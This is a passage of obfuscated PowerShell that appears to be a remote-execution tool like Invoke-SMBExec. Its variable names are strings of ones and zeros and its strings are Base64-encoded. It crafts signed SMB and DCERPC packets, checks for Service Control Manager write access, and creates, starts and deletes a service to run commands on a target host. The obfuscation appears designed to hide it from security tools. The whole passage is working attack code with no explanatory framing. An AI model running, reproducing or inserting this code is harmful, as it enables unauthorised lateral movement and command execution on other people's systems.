                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = 2 
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _01001100101001011 ${10111110011101001}
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAQQBuAGQAWABSAGUAcQB1AGUAcwB0AA==')))
                    }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBEAGkAcwBjAG8AbgBuAGUAYwB0AA==')))
                    {
                        ${10110100100110010} = _10110010011100000 0x71 0x18 0x07,0xc8 ${11000001111000011} ${01100101101011101} ${01101110110001111}
                        if(${00100000101110000})
                        {
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA')))] = 0x05,0x48
                            ${11000000001000110} = ${11000000001000110} + 2
                            [Byte[]]${00100111111000101} = [System.BitConverter]::GetBytes(${11000000001000110}) + 0x00,0x00,0x00,0x00
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00100111111000101}
                        }
                        ${00110110111000000} = _01011001101010110 ${10110100100110010}   
                        ${00111111110011001} = _00010000100110000
                        ${10111010001111001} = _01011001101010110 ${00111111110011001}
                        ${00011110010101001} = _10100001110111101 ${00110110111000000}.Length ${10111010001111001}.Length
                        ${01001111000111011} = _01011001101010110 ${00011110010101001}
                        if(${00100000101110000})
                        {
                            ${01110010111101100} = ${01010101101000111} + ${00110110111000000} + ${10111010001111001} 
                            ${01111011010101110} = ${01100010100111000}.ComputeHash(${01110010111101100})
                            ${01111011010101110} = ${01111011010101110}[0..7]
                            ${10110100100110010}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${01111011010101110}
                            ${00110110111000000} = _01011001101010110 ${10110100100110010}
                        }
                        ${10100100111101111} = ${01001111000111011} + ${00110110111000000} + ${10111010001111001}
                        ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                        ${01110010010100001}.Flush()
                        ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                    }
                }
            }
        }  
        else
        {
            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBDAG8AbgBuAGUAYwB0AA==')))
            try
            {
                while (${10010010100101111} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA='))))
                {
                    switch (${10010010100101111})
                    {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAEEAYwBjAGUAcwBzAA==')))
                        {
                            if([System.BitConverter]::ToString(${00111000010101001}[128..131]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))) -and [System.BitConverter]::ToString(${00111000010101001}[108..127]) -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                            {
                                ${00100000001001011} = ${00111000010101001}[108..127]
                                if(${10011100111101000} -eq $true)
                                {
                                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADEAMAAxADEAMAAwADAAMAAxADAAMAAwADEAMQAwADAAMQB9ACAAaABhAHMAIABTAGUAcgB2AGkAYwBlACAAQwBvAG4AdAByAG8AbAAgAE0AYQBuAGEAZwBlAHIAIAB3AHIAaQB0AGUAIABwAHIAaQB2AGkAbABlAGcAZQAgAG8AbgAgACQAVABhAHIAZwBlAHQA')))
                                    ${00000010111100001} = _10001001111111011 ${00100000001001011} ${10110011011000011} ${00011100101100110} ${00001101010111110} ${01110010101010100}
                                    ${00111010111111011} = _01011001101010110 ${00000010111100001}
                                    if(${00111010111111011}.Length -lt ${01001010101110100})
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                                    }
                                    else
                                    {
                                        ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                                    }
                                }
                                else
                                {
                                    echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABoAGEAcwAgAFMAZQByAHYAaQBjAGUAIABDAG8AbgB0AHIAbwBsACAATQBhAG4AYQBnAGUAcgAgAHcAcgBpAHQAZQAgAHAAcgBpAHYAaQBsAGUAZwBlACAAbwBuACAAJABUAGEAcgBnAGUAdAA=')))
                                    ${01011000010100111} = 2
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                                }
                            }
                            elseif([System.BitConverter]::ToString(${00111000010101001}[128..131]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAA1AC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAMQAwADEAMQAwADAAMAAwADEAMAAwADAAMQAxADAAMAAxAH0AIABkAG8AZQBzACAAbgBvAHQAIABoAGEAdgBlACAAUwBlAHIAdgBpAGMAZQAgAEMAbwBuAHQAcgBvAGwAIABNAGEAbgBhAGcAZQByACAAdwByAGkAdABlACAAcAByAGkAdgBpAGwAZQBnAGUAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                            else
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAG8AbQBlAHQAaABpAG4AZwAgAHcAZQBuAHQAIAB3AHIAbwBuAGcAIAB3AGkAdABoACAAJABUAGEAcgBnAGUAdAA=')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFIAZQBxAHUAZQBzAHQA')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x06,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _00000000010100111 ${01110001111010000}
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAG8AcwBlAFMAZQByAHYAaQBjAGUASABhAG4AZABsAGUA')))
                        {
                            if(${01011000010100111} -eq 1)
                            {
                                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgACQAewAxADAAMQAxADAAMQAxADEAMAAwADEAMAAxADAAMQAxADEAfQAgAGQAZQBsAGUAdABlAGQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                                ${00000010111100001} = _10111000000001000 ${00001010011110110}
                            }
                            else
                            {
                                ${00000010111100001} = _10111000000001000 ${00100000001001011}
                            }
                            ${01011000010100111}++
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00111010111111011} = _01011001101010110 ${00000010111100001}
                            ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001} 
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} (${01010111111111000}.Length + ${00111010111111011}.Length)     
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00110000011001000} = ${01111101001100100}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUgBlAHEAdQBlAHMAdAA=')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${01001010000110001} = 0x73,0x00,0x76,0x00,0x63,0x00,0x63,0x00,0x74,0x00,0x6c,0x00 
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x05,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _01000010011000111 ${01001010000110001}
                            ${01110101111101001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAF8AQQBjAGMAZQBzAHMA')))] = 0x07,0x00,0x00,0x00  
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}  
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100}  
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                            try
                            {
                                ${01110010010100001}.Write(${10100100111101111},0,${10100100111101111}.Length) > $null
                                ${01110010010100001}.Flush()
                                ${01110010010100001}.Read(${00111000010101001},0,${00111000010101001}.Length) > $null
                                if(_10100111110110000 ${00111000010101001}[12..15])
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUABlAG4AZABpAG4AZwA=')))
                                }
                                else
                                {
                                    ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdAB1AHMAUgBlAGMAZQBpAHYAZQBkAA==')))
                                }
                            }
                            catch
                            {
                                echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcwBzAGkAbwBuACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAGkAcwAgAGMAbABvAHMAZQBkAA==')))
                                ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdAA=')))
                            }                    
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001}
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} (${01010111111111000}.Length + ${00111010111111011}.Length)
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}
                            ${00110000011001000} = ${01111101001100100}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ARgBpAHIAcwB0AA==')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101110100100010} = [Math]::Ceiling(${00111010111111011}.Length / ${01001010101110100})
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${10001111000010011} = ${00111010111111011}[0..(${01001010101110100} - 1)]
                            ${00101001010010001} = _01000001100111110 0x01 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${10001111000010011}
                            ${00101001010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111010111111011}.Length)
                            ${10011100001001010} = ${01001010101110100}
                            ${01010111111111000} = _01011001101010110 ${00101001010010001} 
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} ${01010111111111000}.Length
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00110000011001000} = ${01111101001100100}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATQBpAGQAZABsAGUA')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${11000010110010100}++
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00001100000001101} = ${00111010111111011}[${10011100001001010}..(${10011100001001010} + ${01001010101110100} - 1)]
                            ${10011100001001010} += ${01001010101110100}
                            ${00101001010010001} = _01000001100111110 0x00 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${00001100000001101}
                            ${00101001010010001}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA')))] = [System.BitConverter]::GetBytes(${00111010111111011}.Length - ${10011100001001010} + ${01001010101110100})
                            ${01010111111111000} = _01011001101010110 ${00101001010010001}
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} ${01010111111111000}.Length
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}    
                            ${00110000011001000} = ${01111101001100100}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAUwBlAHIAdgBpAGMAZQBXAF8ATABhAHMAdAA=')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${00111100001100110} = ${00111010111111011}[${10011100001001010}..${00111010111111011}.Length]
                            ${00101001010010001} = _01000001100111110 0x02 0 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 ${00111100001100110}
                            ${01010111111111000} = _01011001101010110 ${00101001010010001}
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} ${01010111111111000}.Length
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}    
                            ${00110000011001000} = ${01111101001100100}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAUwBlAHIAdgBpAGMAZQBXAA==')))
                        { 
                            if([System.BitConverter]::ToString(${00111000010101001}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBkAC0AMAA0AC0AMAAwAC0AMAAwAA=='))))
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABDAG8AbQBtAGEAbgBkACAAZQB4AGUAYwB1AHQAZQBkACAAdwBpAHQAaAAgAHMAZQByAHYAaQBjAGUAIAAkAHsAMQAwADEAMQAwADEAMQAxADAAMAAxADAAMQAwADEAMQAxAH0AIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            }
                            elseif([System.BitConverter]::ToString(${00111000010101001}[108..111]) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyAC0AMAAwAC0AMAAwAC0AMAAwAA=='))))
                            {
                                echo $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAGUAcgB2AGkAYwBlACAAJAB7ADEAMAAxADEAMAAxADEAMQAwADAAMQAwADEAMAAxADEAMQB9ACAAZgBhAGkAbABlAGQAIAB0AG8AIABzAHQAYQByAHQAIABvAG4AIAAkAFQAYQByAGcAZQB0AA==')))
                            }
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00
                            }
                            ${00000010111100001} = _01111110000001000 ${00001010011110110}
                            ${00111010111111011} = _01011001101010110 ${00000010111100001}
                            ${00101001010010001} = _01000001100111110 0x03 ${00111010111111011}.Length 0 0 0x01,0x00,0x00,0x00 0x00,0x00 0x02,0x00
                            ${01010111111111000} = _01011001101010110 ${00101001010010001} 
                            ${01110101111101001} = _01001001100010110 ${01110001111010000} (${01010111111111000}.Length + ${00111010111111011}.Length)
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001} 
                            ${00110000011001000} = ${01111101001100100}.Length + ${00111010111111011}.Length + ${01010111111111000}.Length
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${00110000011001000}
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100} + ${01010111111111000} + ${00111010111111011}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGcAbwBmAGYA')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x02,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
                            if(${00100000101110000})
                            {
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA==')))] = 0x08,0x00,0x00,0x00      
                            }
                            ${01110101111101001} = _10011010100100010
                            ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            ${01111101001100100} = _01011001101010110 ${01110101111101001}
                            ${00011110010101001} = _10100001110111101 ${10001010110110010}.Length ${01111101001100100}.Length
                            ${01001111000111011} = _01011001101010110 ${00011110010101001}
                            if(${00100000101110000})
                            {
                                ${10101010000111011} = ${10001010110110010} + ${01111101001100100}
                                ${00010010110010110} = ${00010011111110011}.ComputeHash(${10101010000111011})
                                ${00010010110010110} = ${00010010110010110}[0..15]
                                ${00111111111000101}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA')))] = ${00010010110010110}
                                ${10001010110110010} = _01011001101010110 ${00111111111000101}
                            }
                            ${10100100111101111} = ${01001111000111011} + ${10001010110110010} + ${01111101001100100}
                            ${10010010100101111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAG4AZABSAGUAYwBlAGkAdgBlAA==')))
                        }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAbgBTAEMATQBhAG4AYQBnAGUAcgBXAA==')))
                        {
                            ${01010010111101111} = ${10010010100101111}
                            ${00101000011001000}++
                            ${00111111111000101} = _00110110101000101 0x09,0x00 0x01,0x00 ${00100000101110000} ${00101000011001000} ${01100101101011101} ${10110001011111111} ${10110101111010011}
